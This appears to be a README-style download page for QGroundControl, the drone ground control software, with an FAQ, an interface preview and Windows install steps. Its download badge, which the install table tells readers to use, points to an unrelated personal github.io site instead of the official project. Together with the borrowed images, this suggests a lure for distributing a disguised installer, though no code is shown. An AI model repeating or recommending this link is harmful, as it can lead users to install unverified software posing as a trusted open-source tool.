# QGroundControl — An Operator-Focused Ground Station
QGroundControl is a ground control application for Windows that organizes vehicle setup, mission planning, and live flight awareness in one interface.

<p align="center"><img src="https://s.cafebazaar.ir/images/icons/org.mavlink.qgroundcontrol-55f4eabf-23ff-4748-a66a-048114e9cb72_512x512.png?x-img=v1/resize,h_256,w_256,lossless_false/optimize" alt="QGroundControl logo" width="120"/></p>

[![Download QGroundControl](https://img.shields.io/badge/⬇_Download_QGroundControl-6c757d?style=for-the-badge)](https://anitabailey26.github.io/.github/QGroundControl-Interface-App)

## QGroundControl Questions

| Question | Answer |
|---|---|
| Is QGroundControl free? | Yes. QGroundControl is open-source ground control software. Equipment, connectivity, map data, and third-party services used with it can have their own costs or conditions. |
| Which versions of Windows are supported? | Windows compatibility follows the requirements published for each QGroundControl build. Review the current release information before installing, especially when the computer uses specialized vehicle or radio drivers. |
| How does the QGroundControl mission planning map relate to the Fly interface? | The Plan area is used to place and inspect mission items on the map, while the Fly area combines map context with live instruments and vehicle status. Vehicle Setup keeps configuration tasks separate from active operation. |
| How should I research an NVD QGroundControl CVE result? | Treat NVD and CVE records as starting points for verification, not proof that every installation is affected. Match the listed product and version details to your installed build, then compare the record with QGroundControl project advisories and release information without assuming an unlisted identifier, severity, or impact. |

## Interface Preview

![QGroundControl interface with map and flight instruments](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS6enm51mGi4hPWMDwQEDAd8Bf60vjKUWKGm5RDiRBV2GabCpy3sHDu4YOs&s=10)

*The QGroundControl interface separates planning, vehicle configuration, and active-flight awareness while retaining map context for the operator.*

## Orientation Before Operation

> **Tip:** Identify the active vehicle, connection state, flight mode, position, and primary instruments in the Fly area before interacting with map controls or sending any command.

## First Session

Begin in Vehicle Setup and confirm that the connected system is recognized with the expected configuration. Move to Plan to inspect the mission on the map, including item order and geographic placement, then open Fly to learn where vehicle state, instruments, notifications, and map actions appear during operation. Keep the vehicle in a safe, non-operational condition until the interface and connection behavior are familiar.

## Install QGroundControl on Windows

| Step | What to do |
|---|---|
| 1 | Use the QGroundControl download badge above to obtain the Windows package. |
| 2 | Start the installer and complete the displayed setup choices for the computer and permitted device access. |
| 3 | Launch QGroundControl, attach the intended vehicle or telemetry link, and verify that the expected connection appears before entering the setup, planning, or flight workspace. |
